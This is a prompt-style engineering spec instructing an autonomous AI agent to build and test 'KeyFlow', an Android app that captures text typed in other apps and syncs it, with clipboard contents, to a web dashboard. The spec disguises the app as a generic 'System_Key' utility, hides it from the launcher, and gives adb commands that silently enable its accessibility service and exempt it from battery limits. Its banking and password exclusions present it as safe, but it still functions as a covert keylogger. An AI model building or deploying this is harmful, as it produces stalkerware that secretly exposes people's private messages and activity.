# Comprehensive Engineering & Testing Specification: KeyFlow Enterprise System

Act as an Autonomous Principal Mobile Security Architect, Full-Stack Systems Engineer, and QA Automation Lead. Execute the complete refactor, code fixes, and automated E2E test loop on the connected Motorola Edge 40 (`ZD222GYVTF`).

---

## 1. IDENTITY & LAUNCHER CONFIGURATION (HEADLESS UTILITY MODE)

1. **Manifest Configuration (`app/android/app/src/main/AndroidManifest.xml`)**:
   - Update application label to: `android:label="System_Key"`
   - Configure default native OS utility icon (`@mipmap/ic_launcher`).
   - Remove `<category android:name="android.intent.category.LAUNCHER" />` from `MainActivity` so the app is omitted from the main application drawer.
   - Retain `<action android:name="android.intent.action.MAIN" />` to allow launching directly via **Android Settings -> Apps -> System_Key -> "Open"**.
   - Add custom deep-link scheme:
     ```xml
     <intent-filter>
         <action android:name="android.intent.action.VIEW" />
         <category android:name="android.intent.category.DEFAULT" />
         <category android:name="android.intent.category.BROWSABLE" />
         <data android:scheme="keyflow" android:host="open" />
     </intent-filter>
     ```
2. **Quick Settings Tile (`KeyflowTileService.kt`)**:
   - Implement an Android `TileService` labeled "System Key" with system utility toggle icon to allow single-tap opening of the credential unlock screen from the notification shade.

---

## 2. DATABASE CIPHER / DECIPHER ENGINE (SQLCIPHER)

1. **Local Storage Encryption (`app/lib/core/services/database_helper.dart`)**:
   - Integrate and configure `sqflite_sqlcipher`.
   - On account login/signup, derive a high-entropy encryption key via `flutter_secure_storage` backed by the **Android Hardware Keystore** and user credentials.
   - Initialize database with `openDatabase(path, password: derivedKey)`.
   - Verify on-disk SQLite file is 100% encrypted ciphertext (`file is encrypted or is not a database`).
   - All read/write operations must require an authenticated session; no data is decipherable without valid user credentials.

---

## 3. ZERO-INTERFERENCE FILTER FOR FINANCIAL APPS & CREDENTIALS

1. **Financial App Exclusions (`KeyflowAccessibilityService.kt`)**:
   - Before evaluating window node hierarchies, inspect `event.packageName`.
   - Exclude the following packages immediately with early return (`return`):
     * `com.google.android.apps.nbu.paisa.user` (Google Pay)
     * `com.phonepe.app` (PhonePe)
     * `net.one97.paytm` (Paytm)
     * `in.org.npci.upiapp` (BHIM)
     * `com.sbi.upi`, `com.icicibank.imobile`, `com.hdfcbank.corebanking`, `com.axis.mobile`, `com.kotak.imb`
     * Regex check: `.*(bank|upi|payment|wallet|creditcard|authenticator).*`
   - If a floating overlay is present, immediately set `visibility = View.GONE` to prevent Android `filterTouchesWhenObscured` tapjacking protections.
2. **Hardware Password Protection**:
   - If `sourceNode.isPassword == true` or input type matches `TYPE_TEXT_VARIATION_PASSWORD`, `TYPE_NUMBER_VARIATION_PASSWORD`, or numeric PIN/OTP fields:
     * Immediately call `sourceNode.recycle()` and drop the event.
     * Never log, buffer, or sync any credential data.

---

## 4. SESSION AGGREGATION & DEBOUNCE ENGINE

1. **Consolidated Paragraph Aggregation**:
   - Structure text data as:
     `Session (Date) -> Application Name -> Consolidated Paragraph Text`
   - Implement a **2.5-second inactivity debounce timer** in memory.
   - Do NOT record individual keystroke rows. Push an update/upsert only after 2.5s of typing silence.
2. **Session Boundaries**:
   - Seal the active session into a finalized paragraph card when:
     * Active package name changes.
     * Inactivity exceeds 60 seconds.
     * The input field loses focus or is submitted.

---

## 5. SCREEN RECORDING COMPATIBILITY FOR QA

1. **Bypass FLAG_SECURE in Debug (`MainActivity.kt`)**:
   - Wrap `FLAG_SECURE` configuration inside `if (!kDebugMode)`.
   - Ensure `adb screenrecord`, `scrcpy`, and automated recording scripts display all views without black frames during testing.

---

## 6. AUTONOMOUS E2E TEST & REPAIR LOOP (MOTOROLA EDGE 40)

Target Device: `ZD222GYVTF`

1. **Pre-flight Device Configuration**:
   ```bash
   adb -s ZD222GYVTF shell input keyevent 224
   adb -s ZD222GYVTF shell input swipe 540 2000 540 500 150
   adb -s ZD222GYVTF shell input keyevent 82
   adb -s ZD222GYVTF shell settings put secure enabled_accessibility_services com.keyflow.keyflow_app/com.keyflow.keyflow_app.KeyflowAccessibilityService
   adb -s ZD222GYVTF shell settings put secure accessibility_enabled 1
   adb -s ZD222GYVTF shell dumpsys deviceidle whitelist +com.keyflow.keyflow_app
Execution Runner:

Run python scripts/motorola_authenticated_manual_e2e.py.

Verify Mobile App authentication with test account (user@keyflow.dev / SecurePassword123!).

Launch Web Dashboard (port 3000/5173) with matching credentials.

Test Sequence:

TC-01: Type multi-line sentence in Notes -> confirm 1 consolidated paragraph card appears on Web dashboard after 2.5s.

TC-02: Open Payment/Banking App -> confirm 0 bytes logged, zero interference or warning popups.

TC-03: Type in Password field -> confirm 0 characters logged.

TC-04: Copy URL -> confirm clipboard card syncs to Web.

Dual-Pane Video Compositing & Self-Inspection:

Composite mobile recording (left) and web dashboard (right) into demo_recordings/master_e2e_sync_demo.mp4 via FFmpeg:
-c:v libx264 -pix_fmt yuv420p -movflags +faststart -r 30

Validate video: ensure duration >= 35s, dimensions 1920x1080, and zero blank/black frames.

If any test or frame check fails, resolve code issues and repeat the run.

7. FINAL DELIVERABLES
Updated and clean codebase passing flutter analyze.

Verified composite demonstration video: demo_recordings/master_e2e_sync_demo.mp4.

High-resolution client tutorial video: demo_recordings/client_setup_tutorial.mp4 demonstrating app launch via App Info, credential login, paragraph history, and sync.

Comprehensive deployment manual: CLIENT_SETUP_GUIDE.md detailing step-by-step setup and verification instructions.
